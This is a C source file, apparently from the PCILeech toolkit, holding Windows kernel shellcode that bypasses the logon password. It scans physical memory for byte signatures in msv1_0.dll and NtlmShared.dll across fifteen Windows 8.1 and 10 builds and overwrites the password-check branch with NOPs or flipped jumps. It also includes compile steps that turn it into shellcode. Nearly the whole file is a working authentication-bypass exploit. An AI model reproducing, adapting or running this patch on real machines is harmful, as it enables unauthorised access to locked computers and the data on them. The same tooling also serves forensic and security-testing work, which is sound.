// wx64_unlock.c : kernel code to remove the password requirement when logging on to Windows.
//
// (c) Ulf Frisk, 2016-2020
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with (normal mode):
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_unlock.c
// ml64.exe wx64_common_a.asm /Fewx64_unlock.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_unlock.obj wx64_common.obj
// shellcode64.exe -o wx64_unlock.exe "WINDOWS UNLOCKER - REMOVE PASSWORD REQUIREMENT!                \n===============================================================\nREQUIRED OPTIONS:                                              \n  -0   : Set to one (1) in order to unlock.                    \n         Example: '-0 1'.                                      \n===== RESULT AFTER UNLOCK ATTEMPT (0=SUCCESS) =================%s\nNTSTATUS        : 0x%08X  \n===============================================================\n"
//
// compile with (standalone [8051] mode):
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_unlock.c
// ml64.exe wx64_unlock_standalone.asm /Fewx64_unlock.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_unlock.obj wx64_common.obj
// shellcode64.exe -o wx64_unlock.exe "DUMMY"
//
#include "wx64_common.h"

// ----------------------------- KERNEL DEFINES AND TYPEDEFS BELOW -----------------------------

typedef __int64					PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

typedef struct _PHYSICAL_MEMORY_RANGE {
	QWORD BaseAddress;
	QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

#pragma pack(push, 1) /* DISABLE STRUCT PADDINGS (REENABLE AFTER STRUCT DEFINITIONS) */
typedef struct _IDT_DESCRIPTOR {
	DWORD dwOpaque1;
	QWORD qwAddressISR;
	DWORD dwOpaque2;
} IDT_DESCRIPTOR, *PIDT_DESCRIPTOR;

typedef struct _IDTR {
	WORD nBytes;
	PIDT_DESCRIPTOR pIDT_DESCRIPTOR;
} IDTR, *PIDTR;
#pragma pack(pop) /* RE-ENABLE STRUCT PADDINGS */

//----------------------------------------------------------------------------------------------------------

#undef RtlCompareMemory
#undef RtlCopyMemory
typedef struct tdKERNEL_FUNCTIONS2 {
	VOID(*ExFreePool)(
		_In_ PVOID P);
	PHYSICAL_ADDRESS(*MmGetPhysicalAddress)(
		_In_ PVOID BaseAddress
		);
	PPHYSICAL_MEMORY_RANGE(*MmGetPhysicalMemoryRanges)(
		VOID
		);
	PVOID(*MmMapIoSpace)(
		_In_  PHYSICAL_ADDRESS    PhysicalAddress,
		_In_  SIZE_T              NumberOfBytes,
		_In_  MEMORY_CACHING_TYPE CacheType
		);
	VOID(*MmUnmapIoSpace)(
		_In_  PVOID  BaseAddress,
		_In_  SIZE_T NumberOfBytes
		);
	SIZE_T(*RtlCompareMemory)(
		_In_ const VOID   *Source1,
		_In_ const VOID   *Source2,
		_In_       SIZE_T Length
		);
	VOID(*RtlCopyMemory)(
		_Out_ VOID UNALIGNED *Destination,
		_In_ const VOID UNALIGNED *Source,
		_In_ SIZE_T Length
		);
} KERNEL_FUNCTIONS2, *PKERNEL_FUNCTIONS2;

VOID InitializeKernelFunctions2(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS2 fnk2)
{
	QWORD FUNC2[][2] = {
		{ &fnk2->ExFreePool,							H_ExFreePool },
		{ &fnk2->MmGetPhysicalAddress,					H_MmGetPhysicalAddress },
		{ &fnk2->MmGetPhysicalMemoryRanges,				H_MmGetPhysicalMemoryRanges },
		{ &fnk2->MmMapIoSpace,							H_MmMapIoSpace },
		{ &fnk2->MmUnmapIoSpace,						H_MmUnmapIoSpace },
		{ &fnk2->RtlCompareMemory,						H_RtlCompareMemory },
		{ &fnk2->RtlCopyMemory,							H_RtlCopyMemory }
	};
	for(QWORD j = 0; j < (sizeof(FUNC2) / sizeof(QWORD[2])); j++) {
		*(PQWORD)FUNC2[j][0] = PEGetProcAddressH(qwNtosBase, (DWORD)FUNC2[j][1]);
	}
}

//----------------------------------------------------------------------------------------------------------

typedef struct tdSignatureChunk {
	WORD cbOffset;
	BYTE cb;
	BYTE pb[6];
} SIGNATURE_CHUNK, *PSIGNATURE_CHUNK;

typedef struct tdSignature {
	// in unlock mode: 
	//   chunk[0] = signature chunk 1 (required) 
	//   chunk[1] = signature chunk 2 (optional)
	//   chunk[2] = patch chunk (required)
	SIGNATURE_CHUNK chunk[3];
} SIGNATURE, *PSIGNATURE;

//----------------------------------------------------------------------------------------------------------

NTSTATUS Unlock_FindAndPatch(_In_ PKERNEL_FUNCTIONS2 fnk2, _Inout_ PBYTE pbPages, _In_ DWORD cPages, _In_ PSIGNATURE pSignatures, _In_ DWORD cSignatures)
{
	PBYTE pb;
	DWORD pgIdx, i;
	PSIGNATURE ps;
	for(pgIdx = 0; pgIdx < cPages; pgIdx++) {
		pb = pbPages + (4096 * pgIdx);
		for(i = 0; i < cSignatures; i++) {
			ps = pSignatures + i;
			if(!ps->chunk[0].cb || (ps->chunk[0].cb != fnk2->RtlCompareMemory(pb + ps->chunk[0].cbOffset, ps->chunk[0].pb, ps->chunk[0].cb))) {
				continue;
			}
			if(ps->chunk[1].cb && (ps->chunk[1].cb != fnk2->RtlCompareMemory(pb + ps->chunk[1].cbOffset, ps->chunk[1].pb, ps->chunk[1].cb))) {
				continue;
			}
			fnk2->RtlCopyMemory(pb + ps->chunk[2].cbOffset, ps->chunk[2].pb, ps->chunk[2].cb);
			return S_OK;
		}
	}
	return E_FAIL;
}

#define NUMBER_OF_SIGNATURES 15
NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
{
	SIGNATURE oSigs[NUMBER_OF_SIGNATURES] = {
		// win8.1x64 msv1_0.dll (2014-10-29)
		{ .chunk = {
			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xFF, 0x15, 0x42, 0xA4 } },
			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0F, 0x85, 0x46, 0x88 } },
			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// win8.1x64 msv1_0.dll (2015-10-30)
		{ .chunk = {
			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xFF, 0x15, 0xC2, 0x07 } },
			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0F, 0x85, 0xCE, 0xBC } },
			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// win8.1x64 msv1_0.dll (2016-03-16)
		{ .chunk = {
			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xFF, 0x15, 0x22, 0x04 } },
			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0F, 0x85, 0xB2, 0xB9 } },
			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2015-07-10)/10.0.10240.16384]
		{ .chunk = {
			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xff, 0x15, 0x4b, 0x1c } },
			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0f, 0x85, 0x18, 0xfb } },
			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2015-10-30)/10.0.10586.0]
		{ .chunk = {
			{ .cbOffset = 0x62f,.cb = 4,.pb = { 0xff, 0x15, 0xb3, 0x1b } },
			{ .cbOffset = 0x638,.cb = 4,.pb = { 0x0f, 0x85, 0x18, 0xfb } },
			{ .cbOffset = 0x638,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2016-07-16)/10.0.14393.0]
		{ .chunk = {
			{ .cbOffset = 0x6df,.cb = 4,.pb = { 0xff, 0x15, 0xd3, 0x1b } },
			{ .cbOffset = 0x6e8,.cb = 4,.pb = { 0x0f, 0x85, 0x18, 0xfb } },
			{ .cbOffset = 0x6e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2019-02-06)/10.0.14393.2791]
		{.chunk = {
			{.cbOffset = 0x6f5,.cb = 6,.pb = { 0x49, 0x3B, 0xC6, 0x0F, 0x85, 0x18 } },
			{.cbOffset = 0x6fb,.cb = 5,.pb = { 0x0FB, 0xFF, 0xFF, 0xB8, 0x01 } },
			{.cbOffset = 0x6f9,.cb = 1,.pb = { 0x84 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2017-03-18)/10.0.15063.0]
		{ .chunk = {
			{ .cbOffset = 0x615,.cb = 4,.pb = { 0xff, 0x15, 0xc5, 0x1c } },
			{ .cbOffset = 0x61e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
			{ .cbOffset = 0x61e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2019-09-30)/10.0.15063.2106]
		{.chunk = {
			{.cbOffset = 0x625,.cb = 4,.pb = { 0xff, 0x15, 0xc5, 0x1c } },
			{.cbOffset = 0x62e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
			{.cbOffset = 0x62e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2017-09-29)/10.0.16299.15]
		{ .chunk = {
			{ .cbOffset = 0x615,.cb = 4,.pb = { 0xff, 0x15, 0xd5, 0x1c } },
			{ .cbOffset = 0x61e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
			{ .cbOffset = 0x61e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2018-04-11)/10.0.17134.1]
        { .chunk = {
            { .cbOffset = 0x695,.cb = 4,.pb = { 0xff, 0x15, 0x55, 0x1c } },
            { .cbOffset = 0x69e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
            { .cbOffset = 0x69e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
        },
		// Windows 10 x64 [NtlmShared.dll (2019-10-02)/10.0.17134.1067]
		{.chunk = {
			{.cbOffset = 0x6ab,.cb = 6,.pb = { 0x49, 0x3B, 0xC6, 0x0F, 0x85, 0x2E } },
			{.cbOffset = 0x6b1,.cb = 5,.pb = { 0xFB, 0xFF, 0xFF, 0xB0, 0x01 } },
			{.cbOffset = 0x6af,.cb = 1,.pb = { 0x84 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2018-09-15)/10.0.17763.1]
		{.chunk = {
			{.cbOffset = 0x740,.cb = 4,.pb = { 0xff, 0x15, 0xb2, 0x1b } },
			{.cbOffset = 0x749,.cb = 4,.pb = { 0x0f, 0x84, 0x0b, 0xfb } },
			{.cbOffset = 0x749,.cb = 2,.pb = { 0x0f, 0x85 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2019-03-19)/10.0.18362.1]
		// Windows 10 x64 [NtlmShared.dll (2019-10-06)/10.0.18362.418]
		{.chunk = {
			{.cbOffset = 0x741,.cb = 6,.pb = { 0x32, 0xC0, 0xE9, 0x04, 0xFB, 0xFF } },
			{.cbOffset = 0x741,.cb = 6,.pb = { 0x32, 0xC0, 0xE9, 0x04, 0xFB, 0xFF } },
			{.cbOffset = 0x741,.cb = 2,.pb = { 0xb0, 0x01 } } }
		},
		// Windows 10 x64 [NtlmShared.dll (2019-12-07)/10.0.19041.1]
		{.chunk = {
			{.cbOffset = 0x426,.cb = 5,.pb = { 0x48, 0xff, 0x15, 0x53, 0x20 } },
			{.cbOffset = 0x435,.cb = 6,.pb = { 0x0f, 0x84, 0xba, 0xfa, 0xff, 0xff } },
			{.cbOffset = 0x435,.cb = 2,.pb = { 0x0f, 0x85 } } }
		}
	};
	KERNEL_FUNCTIONS2 fnk2;
	PPHYSICAL_MEMORY_RANGE pMemMap, pMM;
	SIZE_T i, cMemMap;
	QWORD qwBaseAddress = 0;
	PVOID pvMemory;
	NTSTATUS nt;
	// 1: Intialize function table
	InitializeKernelFunctions2(qwAddrNtosBase, &fnk2);
	// 2: Retrieve physical memory map
	pMemMap = fnk2.MmGetPhysicalMemoryRanges();
	if(pMemMap == NULL) {
		return E_FAIL;
	}
	for(cMemMap = 0; pMemMap[cMemMap].BaseAddress || pMemMap[cMemMap].NumberOfBytes; cMemMap++);
	// 3: Search memory and unlock if signature is found
	while(qwBaseAddress + 0x10000 <= pMemMap[cMemMap - 1].BaseAddress + pMemMap[cMemMap - 1].NumberOfBytes) {
		for(i = 0; i < cMemMap; i++) {
			pMM = &pMemMap[i];
			if(((pMM->BaseAddress < qwBaseAddress) && (pMM->BaseAddress + pMM->NumberOfBytes > qwBaseAddress + 0x10000))) {
				// is inside range!
				pvMemory = fnk2.MmMapIoSpace(qwBaseAddress, 0x10000, 0);
				if(pvMemory) {
					nt = Unlock_FindAndPatch(&fnk2, pvMemory, 0x10000 / 0x1000, oSigs, NUMBER_OF_SIGNATURES);
					fnk2.MmUnmapIoSpace(pvMemory, 0x10000);
					if(NT_SUCCESS(nt)) {
						// found and patched! - exit!
						goto cleanup;
					}
				}
				break;
			}
		}
		qwBaseAddress += 0x10000;
	}
	nt = E_FAIL;
cleanup:
	fnk2.ExFreePool(pMemMap);
	return nt;
}

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	if(pk->dataIn[0] == 1) {
		pk->dataOut[0] = (QWORD)Unlock(pk->AddrKernelBase);
	} else {
		pk->dataOut[0] = ERROR_INVALID_PARAMETER;
	}
}